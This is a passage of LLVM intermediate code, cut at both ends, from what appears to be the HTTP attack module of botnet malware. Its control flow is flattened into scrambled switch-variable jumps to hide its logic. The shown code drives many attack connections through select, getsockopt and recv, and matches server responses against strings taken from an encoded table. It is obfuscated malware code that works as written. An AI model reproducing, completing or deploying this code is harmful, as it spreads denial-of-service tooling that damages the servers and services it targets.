  %881 = load i32, i32* %880, align 4
  %882 = add nsw i32 %881, 1
  store i32 %882, i32* %23, align 4
  store i32 536142275, i32* %switchVar
  br label %loopEnd

; <label>:883:                                    ; preds = %loopEntry
  store i32 -1694037774, i32* %switchVar
  br label %loopEnd

; <label>:884:                                    ; preds = %loopEntry
  %885 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %886 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %885, i32 0, i32 1
  %887 = load i8, i8* %886, align 4
  %888 = zext i8 %887 to i32
  %889 = icmp eq i32 %888, 7
  %890 = select i1 %889, i32 -106941578, i32 -2117092127
  store i32 %890, i32* %switchVar
  br label %loopEnd

; <label>:891:                                    ; preds = %loopEntry
  %892 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %893 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %892, i32 0, i32 0
  %894 = load i32, i32* %893, align 4
  %895 = srem i32 %894, 64
  %896 = zext i32 %895 to i64
  %897 = shl i64 1, %896
  %898 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %899 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %900 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %899, i32 0, i32 0
  %901 = load i32, i32* %900, align 4
  %902 = sdiv i32 %901, 64
  %903 = sext i32 %902 to i64
  %904 = getelementptr inbounds [16 x i64], [16 x i64]* %898, i64 0, i64 %903
  %905 = load i64, i64* %904, align 8
  %906 = or i64 %905, %897
  store i64 %906, i64* %904, align 8
  %907 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %908 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %907, i32 0, i32 0
  %909 = load i32, i32* %908, align 4
  %910 = load i32, i32* %23, align 4
  %911 = icmp sgt i32 %909, %910
  %912 = select i1 %911, i32 -866391389, i32 -1498129756
  store i32 %912, i32* %switchVar
  br label %loopEnd

; <label>:913:                                    ; preds = %loopEntry
  %914 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %915 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %914, i32 0, i32 0
  %916 = load i32, i32* %915, align 4
  %917 = add nsw i32 %916, 1
  store i32 %917, i32* %23, align 4
  store i32 -1498129756, i32* %switchVar
  br label %loopEnd

; <label>:918:                                    ; preds = %loopEntry
  store i32 1747107870, i32* %switchVar
  br label %loopEnd

; <label>:919:                                    ; preds = %loopEntry
  %920 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %921 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %920, i32 0, i32 1
  %922 = load i8, i8* %921, align 4
  %923 = zext i8 %922 to i32
  %924 = icmp eq i32 %923, 10
  %925 = select i1 %924, i32 1464513630, i32 -274386569
  store i32 %925, i32* %switchVar
  br label %loopEnd

; <label>:926:                                    ; preds = %loopEntry
  %927 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %928 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %927, i32 0, i32 0
  %929 = load i32, i32* %928, align 4
  %930 = srem i32 %929, 64
  %931 = zext i32 %930 to i64
  %932 = shl i64 1, %931
  %933 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %934 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %935 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %934, i32 0, i32 0
  %936 = load i32, i32* %935, align 4
  %937 = sdiv i32 %936, 64
  %938 = sext i32 %937 to i64
  %939 = getelementptr inbounds [16 x i64], [16 x i64]* %933, i64 0, i64 %938
  %940 = load i64, i64* %939, align 8
  %941 = or i64 %940, %932
  store i64 %941, i64* %939, align 8
  %942 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %943 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %942, i32 0, i32 0
  %944 = load i32, i32* %943, align 4
  %945 = load i32, i32* %23, align 4
  %946 = icmp sgt i32 %944, %945
  %947 = select i1 %946, i32 -1382804257, i32 1521497501
  store i32 %947, i32* %switchVar
  br label %loopEnd

; <label>:948:                                    ; preds = %loopEntry
  %949 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %950 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %949, i32 0, i32 0
  %951 = load i32, i32* %950, align 4
  %952 = add nsw i32 %951, 1
  store i32 %952, i32* %23, align 4
  store i32 1521497501, i32* %switchVar
  br label %loopEnd

; <label>:953:                                    ; preds = %loopEntry
  store i32 -1253819051, i32* %switchVar
  br label %loopEnd

; <label>:954:                                    ; preds = %loopEntry
  %955 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %956 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %955, i32 0, i32 1
  %957 = load i8, i8* %956, align 4
  %958 = zext i8 %957 to i32
  %959 = icmp eq i32 %958, 11
  %960 = select i1 %959, i32 595553524, i32 -1265196952
  store i32 %960, i32* %switchVar
  br label %loopEnd

; <label>:961:                                    ; preds = %loopEntry
  %962 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %963 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %962, i32 0, i32 1
  store i8 0, i8* %963, align 4
  %964 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %965 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %964, i32 0, i32 0
  %966 = load i32, i32* %965, align 4
  %967 = call i32 @close(i32 %966)
  %968 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %969 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %968, i32 0, i32 0
  store i32 -1, i32* %969, align 4
  store i32 -865724330, i32* %switchVar
  br label %loopEnd

; <label>:970:                                    ; preds = %loopEntry
  %971 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %972 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %971, i32 0, i32 1
  store i8 0, i8* %972, align 4
  %973 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %974 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %973, i32 0, i32 0
  %975 = load i32, i32* %974, align 4
  %976 = call i32 @close(i32 %975)
  %977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %977, i32 0, i32 0
  store i32 -1, i32* %978, align 4
  store i32 -865724330, i32* %switchVar
  br label %loopEnd

; <label>:979:                                    ; preds = %loopEntry
  store i32 -1253819051, i32* %switchVar
  br label %loopEnd

; <label>:980:                                    ; preds = %loopEntry
  store i32 1747107870, i32* %switchVar
  br label %loopEnd

; <label>:981:                                    ; preds = %loopEntry
  store i32 -1694037774, i32* %switchVar
  br label %loopEnd

; <label>:982:                                    ; preds = %loopEntry
  store i32 -1862035464, i32* %switchVar
  br label %loopEnd

; <label>:983:                                    ; preds = %loopEntry
  store i32 646044068, i32* %switchVar
  br label %loopEnd

; <label>:984:                                    ; preds = %loopEntry
  store i32 -1577572110, i32* %switchVar
  br label %loopEnd

; <label>:985:                                    ; preds = %loopEntry
  store i32 792116999, i32* %switchVar
  br label %loopEnd

; <label>:986:                                    ; preds = %loopEntry
  %987 = load i32, i32* %9, align 4
  %988 = add nsw i32 %987, 1
  store i32 %988, i32* %9, align 4
  store i32 -120314153, i32* %switchVar
  br label %loopEnd

; <label>:989:                                    ; preds = %loopEntry
  %990 = load i32, i32* %23, align 4
  %991 = icmp eq i32 %990, 0
  %992 = select i1 %991, i32 2084519512, i32 555490172
  store i32 %992, i32* %switchVar
  br label %loopEnd

; <label>:993:                                    ; preds = %loopEntry
  store i32 -728621910, i32* %switchVar
  br label %loopEnd

; <label>:994:                                    ; preds = %loopEntry
  %995 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 1
  store i64 0, i64* %995, align 8
  %996 = getelementptr inbounds %struct.timeval, %struct.timeval* %25, i32 0, i32 0
  store i64 1, i64* %996, align 8
  %997 = load i32, i32* %23, align 4
  %998 = call i32 @select(i32 %997, %struct.fd_set* %21, %struct.fd_set* %22, %struct.fd_set* null, %struct.timeval* %25)
  store i32 %998, i32* %24, align 4
  %999 = call i64 @time(i64* null) #6
  %1000 = trunc i64 %999 to i32
  store i32 %1000, i32* %27, align 4
  %1001 = load i32, i32* %24, align 4
  %1002 = icmp slt i32 %1001, 1
  %1003 = select i1 %1002, i32 -1988608362, i32 502775756
  store i32 %1003, i32* %switchVar
  br label %loopEnd

; <label>:1004:                                   ; preds = %loopEntry
  store i32 -728621910, i32* %switchVar
  br label %loopEnd

; <label>:1005:                                   ; preds = %loopEntry
  store i32 0, i32* %9, align 4
  store i32 -1529631243, i32* %switchVar
  br label %loopEnd

; <label>:1006:                                   ; preds = %loopEntry
  %1007 = load i32, i32* %9, align 4
  %1008 = load i32, i32* %18, align 4
  %1009 = icmp slt i32 %1007, %1008
  %1010 = select i1 %1009, i32 -2019813585, i32 -666413566
  store i32 %1010, i32* %switchVar
  br label %loopEnd

; <label>:1011:                                   ; preds = %loopEntry
  %1012 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %1013 = load i32, i32* %9, align 4
  %1014 = sext i32 %1013 to i64
  %1015 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1012, i64 %1014
  store %struct.attack_http_state* %1015, %struct.attack_http_state** %26, align 8
  %1016 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1017 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1016, i32 0, i32 0
  %1018 = load i32, i32* %1017, align 4
  %1019 = icmp eq i32 %1018, -1
  %1020 = select i1 %1019, i32 -354237080, i32 -1758360404
  store i32 %1020, i32* %switchVar
  br label %loopEnd

; <label>:1021:                                   ; preds = %loopEntry
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:1022:                                   ; preds = %loopEntry
  %1023 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %22, i32 0, i32 0
  %1024 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1025 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1024, i32 0, i32 0
  %1026 = load i32, i32* %1025, align 4
  %1027 = sdiv i32 %1026, 64
  %1028 = sext i32 %1027 to i64
  %1029 = getelementptr inbounds [16 x i64], [16 x i64]* %1023, i64 0, i64 %1028
  %1030 = load i64, i64* %1029, align 8
  %1031 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1032 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1031, i32 0, i32 0
  %1033 = load i32, i32* %1032, align 4
  %1034 = srem i32 %1033, 64
  %1035 = zext i32 %1034 to i64
  %1036 = shl i64 1, %1035
  %1037 = and i64 %1030, %1036
  %1038 = icmp ne i64 %1037, 0
  %1039 = select i1 %1038, i32 422554310, i32 -1135419723
  store i32 %1039, i32* %switchVar
  br label %loopEnd

; <label>:1040:                                   ; preds = %loopEntry
  store i32 0, i32* %35, align 4
  store i32 4, i32* %36, align 4
  %1041 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1042 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1041, i32 0, i32 0
  %1043 = load i32, i32* %1042, align 4
  %1044 = bitcast i32* %35 to i8*
  %1045 = call i32 @getsockopt(i32 %1043, i32 1, i32 4, i8* %1044, i32* %36) #6
  store i32 %1045, i32* %12, align 4
  %1046 = load i32, i32* %35, align 4
  %1047 = icmp eq i32 %1046, 0
  %1048 = select i1 %1047, i32 1530753313, i32 -1908550454
  store i32 %1048, i32* %switchVar
  br label %loopEnd

; <label>:1049:                                   ; preds = %loopEntry
  %1050 = load i32, i32* %12, align 4
  %1051 = icmp eq i32 %1050, 0
  %1052 = select i1 %1051, i32 -2014517752, i32 -1908550454
  store i32 %1052, i32* %switchVar
  br label %loopEnd

; <label>:1053:                                   ; preds = %loopEntry
  %1054 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1055 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1054, i32 0, i32 1
  store i8 4, i8* %1055, align 4
  store i32 770170404, i32* %switchVar
  br label %loopEnd

; <label>:1056:                                   ; preds = %loopEntry
  %1057 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1058 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1057, i32 0, i32 0
  %1059 = load i32, i32* %1058, align 4
  %1060 = call i32 @close(i32 %1059)
  %1061 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1062 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1061, i32 0, i32 0
  store i32 -1, i32* %1062, align 4
  %1063 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1064 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1063, i32 0, i32 1
  store i8 0, i8* %1064, align 4
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:1065:                                   ; preds = %loopEntry
  store i32 -1135419723, i32* %switchVar
  br label %loopEnd

; <label>:1066:                                   ; preds = %loopEntry
  %1067 = getelementptr inbounds %struct.fd_set, %struct.fd_set* %21, i32 0, i32 0
  %1068 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1069 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1068, i32 0, i32 0
  %1070 = load i32, i32* %1069, align 4
  %1071 = sdiv i32 %1070, 64
  %1072 = sext i32 %1071 to i64
  %1073 = getelementptr inbounds [16 x i64], [16 x i64]* %1067, i64 0, i64 %1072
  %1074 = load i64, i64* %1073, align 8
  %1075 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1076 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1075, i32 0, i32 0
  %1077 = load i32, i32* %1076, align 4
  %1078 = srem i32 %1077, 64
  %1079 = zext i32 %1078 to i64
  %1080 = shl i64 1, %1079
  %1081 = and i64 %1074, %1080
  %1082 = icmp ne i64 %1081, 0
  %1083 = select i1 %1082, i32 -1223056093, i32 -1410630838
  store i32 %1083, i32* %switchVar
  br label %loopEnd

; <label>:1084:                                   ; preds = %loopEntry
  %1085 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1086 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1085, i32 0, i32 1
  %1087 = load i8, i8* %1086, align 4
  %1088 = zext i8 %1087 to i32
  %1089 = icmp eq i32 %1088, 6
  %1090 = select i1 %1089, i32 2072735996, i32 -959065545
  store i32 %1090, i32* %switchVar
  br label %loopEnd

; <label>:1091:                                   ; preds = %loopEntry
  store i32 0, i32* %37, align 4
  %1092 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  call void @util_zero(i8* %1092, i32 10240)
  %1093 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1094 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1093, i32 0, i32 0
  %1095 = load i32, i32* %1094, align 4
  %1096 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1097 = call i64 @recv(i32 %1095, i8* %1096, i64 10240, i32 16386)
  %1098 = trunc i64 %1097 to i32
  store i32 %1098, i32* %12, align 4
  %1099 = icmp slt i32 %1098, 1
  %1100 = select i1 %1099, i32 -303963528, i32 230101174
  store i32 %1100, i32* %switchVar
  br label %loopEnd

; <label>:1101:                                   ; preds = %loopEntry
  %1102 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1103 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1102, i32 0, i32 0
  %1104 = load i32, i32* %1103, align 4
  %1105 = call i32 @close(i32 %1104)
  %1106 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1107 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1106, i32 0, i32 0
  store i32 -1, i32* %1107, align 4
  %1108 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1109 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1108, i32 0, i32 1
  store i8 0, i8* %1109, align 4
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:1110:                                   ; preds = %loopEntry
  %1111 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1112 = load i32, i32* %12, align 4
  %1113 = call i32 @util_memsearch(i8* %1111, i32 %1112, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1114 = icmp eq i32 %1113, -1
  %1115 = select i1 %1114, i32 -421709571, i32 986016826
  store i32 %1115, i32* %switchVar
  br label %loopEnd

; <label>:1116:                                   ; preds = %loopEntry
  %1117 = load i32, i32* %12, align 4
  %1118 = icmp slt i32 %1117, 10240
  %1119 = select i1 %1118, i32 2078313923, i32 986016826
  store i32 %1119, i32* %switchVar
  br label %loopEnd

; <label>:1120:                                   ; preds = %loopEntry
  store i32 -218755353, i32* %switchVar
  br label %loopEnd

; <label>:1121:                                   ; preds = %loopEntry
  %1122 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1123 = load i32, i32* %12, align 4
  %1124 = call i32 @util_memsearch(i8* %1122, i32 %1123, i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.8, i32 0, i32 0), i32 4)
  %1125 = sext i32 %1124 to i64
  %1126 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1125
  store i8 0, i8* %1126, align 1
  %1127 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1128 = load i32, i32* %12, align 4
  %1129 = call i8* @table_retrieve_val(i32 62, i32* null)
  %1130 = call i32 @util_stristr(i8* %1127, i32 %1128, i8* %1129)
  %1131 = icmp ne i32 %1130, -1
  %1132 = select i1 %1131, i32 -1205350572, i32 -1799508473
  store i32 %1132, i32* %switchVar
  br label %loopEnd

; <label>:1133:                                   ; preds = %loopEntry
  %1134 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1135 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1134, i32 0, i32 11
  store i32 2, i32* %1135, align 4
  store i32 -1799508473, i32* %switchVar
  br label %loopEnd

; <label>:1136:                                   ; preds = %loopEntry
  %1137 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1138 = load i32, i32* %12, align 4
  %1139 = call i8* @table_retrieve_val(i32 61, i32* null)
  %1140 = call i32 @util_stristr(i8* %1137, i32 %1138, i8* %1139)
  %1141 = icmp ne i32 %1140, -1
  %1142 = select i1 %1141, i32 -83504973, i32 1002072451
  store i32 %1142, i32* %switchVar
  br label %loopEnd

; <label>:1143:                                   ; preds = %loopEntry
  %1144 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1145 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1144, i32 0, i32 11
  store i32 1, i32* %1145, align 4
  store i32 1002072451, i32* %switchVar
  br label %loopEnd

; <label>:1146:                                   ; preds = %loopEntry
  %1147 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1148 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1147, i32 0, i32 12
  store i32 0, i32* %1148, align 4
  %1149 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1150 = load i32, i32* %12, align 4
  %1151 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1152 = call i32 @util_stristr(i8* %1149, i32 %1150, i8* %1151)
  %1153 = icmp ne i32 %1152, -1
  %1154 = select i1 %1153, i32 1684588380, i32 -1195566466
  store i32 %1154, i32* %switchVar
  br label %loopEnd

; <label>:1155:                                   ; preds = %loopEntry
  %1156 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1157 = load i32, i32* %12, align 4
  %1158 = call i8* @table_retrieve_val(i32 60, i32* null)
  %1159 = call i32 @util_stristr(i8* %1156, i32 %1157, i8* %1158)
  store i32 %1159, i32* %38, align 4
  %1160 = load i32, i32* %38, align 4
  %1161 = sext i32 %1160 to i64
  %1162 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1161
  %1163 = load i8, i8* %1162, align 1
  %1164 = sext i8 %1163 to i32
  %1165 = icmp eq i32 %1164, 32
  %1166 = select i1 %1165, i32 1796917298, i32 -582392535
  store i32 %1166, i32* %switchVar
  br label %loopEnd

; <label>:1167:                                   ; preds = %loopEntry
  %1168 = load i32, i32* %38, align 4
  %1169 = add nsw i32 %1168, 1
  store i32 %1169, i32* %38, align 4
  store i32 -582392535, i32* %switchVar
  br label %loopEnd

; <label>:1170:                                   ; preds = %loopEntry
  %1171 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1172 = load i32, i32* %38, align 4
  %1173 = sext i32 %1172 to i64
  %1174 = getelementptr inbounds i8, i8* %1171, i64 %1173
  %1175 = load i32, i32* %12, align 4
  %1176 = load i32, i32* %38, align 4
  %1177 = sub nsw i32 %1175, %1176
  %1178 = call i32 @util_memsearch(i8* %1174, i32 %1177, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1178, i32* %39, align 4
  %1179 = load i32, i32* %39, align 4
  %1180 = icmp ne i32 %1179, -1
  %1181 = select i1 %1180, i32 433827636, i32 96692902
  store i32 %1181, i32* %switchVar
  br label %loopEnd

; <label>:1182:                                   ; preds = %loopEntry
  %1183 = load i32, i32* %38, align 4
  %1184 = sext i32 %1183 to i64
  %1185 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1184
  store i8* %1185, i8** %40, align 8
  %1186 = load i32, i32* %39, align 4
  %1187 = icmp sge i32 %1186, 2
  %1188 = select i1 %1187, i32 -1052385994, i32 -396390421
  store i32 %1188, i32* %switchVar
  br label %loopEnd

; <label>:1189:                                   ; preds = %loopEntry
  %1190 = load i32, i32* %39, align 4
  %1191 = sub nsw i32 %1190, 2
  store i32 %1191, i32* %39, align 4
  store i32 -396390421, i32* %switchVar
  br label %loopEnd

; <label>:1192:                                   ; preds = %loopEntry
  %1193 = load i32, i32* %38, align 4
  %1194 = load i32, i32* %39, align 4
  %1195 = add nsw i32 %1193, %1194
  %1196 = sext i32 %1195 to i64
  %1197 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1196
  store i8 0, i8* %1197, align 1
  %1198 = load i8*, i8** %40, align 8
  %1199 = load i8*, i8** %40, align 8
  %1200 = call i32 @util_strlen(i8* %1199)
  %1201 = call i8* @table_retrieve_val(i32 59, i32* null)
  %1202 = call i32 @util_stristr(i8* %1198, i32 %1200, i8* %1201)
  %1203 = icmp ne i32 %1202, 0
  %1204 = select i1 %1203, i32 -1628062767, i32 1503474292
  store i32 %1204, i32* %switchVar
  br label %loopEnd

; <label>:1205:                                   ; preds = %loopEntry
  %1206 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1207 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1206, i32 0, i32 12
  store i32 1, i32* %1207, align 4
  store i32 1503474292, i32* %switchVar
  br label %loopEnd

; <label>:1208:                                   ; preds = %loopEntry
  store i32 96692902, i32* %switchVar
  br label %loopEnd

; <label>:1209:                                   ; preds = %loopEntry
  store i32 -1195566466, i32* %switchVar
  br label %loopEnd

; <label>:1210:                                   ; preds = %loopEntry
  %1211 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1212 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1211, i32 0, i32 13
  store i32 0, i32* %1212, align 4
  %1213 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1214 = load i32, i32* %12, align 4
  %1215 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1216 = call i32 @util_stristr(i8* %1213, i32 %1214, i8* %1215)
  %1217 = icmp ne i32 %1216, -1
  %1218 = select i1 %1217, i32 -1898084102, i32 -1054755709
  store i32 %1218, i32* %switchVar
  br label %loopEnd

; <label>:1219:                                   ; preds = %loopEntry
  %1220 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1221 = load i32, i32* %12, align 4
  %1222 = call i8* @table_retrieve_val(i32 57, i32* null)
  %1223 = call i32 @util_stristr(i8* %1220, i32 %1221, i8* %1222)
  store i32 %1223, i32* %41, align 4
  %1224 = load i32, i32* %41, align 4
  %1225 = sext i32 %1224 to i64
  %1226 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1225
  %1227 = load i8, i8* %1226, align 1
  %1228 = sext i8 %1227 to i32
  %1229 = icmp eq i32 %1228, 32
  %1230 = select i1 %1229, i32 -1961719596, i32 -1275813871
  store i32 %1230, i32* %switchVar
  br label %loopEnd

; <label>:1231:                                   ; preds = %loopEntry
  %1232 = load i32, i32* %41, align 4
  %1233 = add nsw i32 %1232, 1
  store i32 %1233, i32* %41, align 4
  store i32 -1275813871, i32* %switchVar
  br label %loopEnd

; <label>:1234:                                   ; preds = %loopEntry
  %1235 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1236 = load i32, i32* %41, align 4
  %1237 = sext i32 %1236 to i64
  %1238 = getelementptr inbounds i8, i8* %1235, i64 %1237
  %1239 = load i32, i32* %12, align 4
  %1240 = load i32, i32* %41, align 4
  %1241 = sub nsw i32 %1239, %1240
  %1242 = call i32 @util_memsearch(i8* %1238, i32 %1241, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %1242, i32* %42, align 4
  %1243 = load i32, i32* %42, align 4
  %1244 = icmp ne i32 %1243, -1
  %1245 = select i1 %1244, i32 -1561555539, i32 -2058864946
  store i32 %1245, i32* %switchVar
  br label %loopEnd

; <label>:1246:                                   ; preds = %loopEntry
  %1247 = load i32, i32* %41, align 4
  %1248 = sext i32 %1247 to i64
  %1249 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1248
  store i8* %1249, i8** %43, align 8
  %1250 = load i32, i32* %42, align 4
  %1251 = icmp sge i32 %1250, 2
  %1252 = select i1 %1251, i32 -77268513, i32 -1574955637
  store i32 %1252, i32* %switchVar
  br label %loopEnd

; <label>:1253:                                   ; preds = %loopEntry
  %1254 = load i32, i32* %42, align 4
  %1255 = sub nsw i32 %1254, 2
  store i32 %1255, i32* %42, align 4
  store i32 -1574955637, i32* %switchVar
  br label %loopEnd

; <label>:1256:                                   ; preds = %loopEntry
  %1257 = load i32, i32* %41, align 4
  %1258 = load i32, i32* %42, align 4
  %1259 = add nsw i32 %1257, %1258
  %1260 = sext i32 %1259 to i64
  %1261 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1260
  store i8 0, i8* %1261, align 1
  %1262 = load i8*, i8** %43, align 8
  %1263 = load i8*, i8** %43, align 8
  %1264 = call i32 @util_strlen(i8* %1263)
  %1265 = call i8* @table_retrieve_val(i32 58, i32* null)
  %1266 = call i32 @util_stristr(i8* %1262, i32 %1264, i8* %1265)
  %1267 = icmp ne i32 %1266, 0
  %1268 = select i1 %1267, i32 402156900, i32 -574710374
  store i32 %1268, i32* %switchVar
  br label %loopEnd

; <label>:1269:                                   ; preds = %loopEntry
  %1270 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %1271 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %1270, i32 0, i32 13
  store i32 1, i32* %1271, align 4
  store i32 -574710374, i32* %switchVar
  br label %loopEnd

; <label>:1272:                                   ; preds = %loopEntry
  store i32 -2058864946, i32* %switchVar
  br label %loopEnd

; <label>:1273:                                   ; preds = %loopEntry
  store i32 -1054755709, i32* %switchVar
  br label %loopEnd

; <label>:1274:                                   ; preds = %loopEntry
  %1275 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1276 = load i32, i32* %12, align 4
  %1277 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1278 = call i32 @util_stristr(i8* %1275, i32 %1276, i8* %1277)
  %1279 = icmp ne i32 %1278, -1
  %1280 = select i1 %1279, i32 1044357268, i32 -1700423069
  store i32 %1280, i32* %switchVar
  br label %loopEnd

; <label>:1281:                                   ; preds = %loopEntry
  %1282 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1283 = load i32, i32* %12, align 4
  %1284 = call i8* @table_retrieve_val(i32 56, i32* null)
  %1285 = call i32 @util_stristr(i8* %1282, i32 %1283, i8* %1284)
  store i32 %1285, i32* %44, align 4
  %1286 = load i32, i32* %44, align 4
  %1287 = sext i32 %1286 to i64
  %1288 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i64 0, i64 %1287
  %1289 = load i8, i8* %1288, align 1
  %1290 = sext i8 %1289 to i32
  %1291 = icmp eq i32 %1290, 32
  %1292 = select i1 %1291, i32 262208459, i32 -1176310657
  store i32 %1292, i32* %switchVar
  br label %loopEnd

; <label>:1293:                                   ; preds = %loopEntry
  %1294 = load i32, i32* %44, align 4
  %1295 = add nsw i32 %1294, 1
  store i32 %1295, i32* %44, align 4
  store i32 -1176310657, i32* %switchVar
  br label %loopEnd

; <label>:1296:                                   ; preds = %loopEntry
  %1297 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %1298 = load i32, i32* %44, align 4
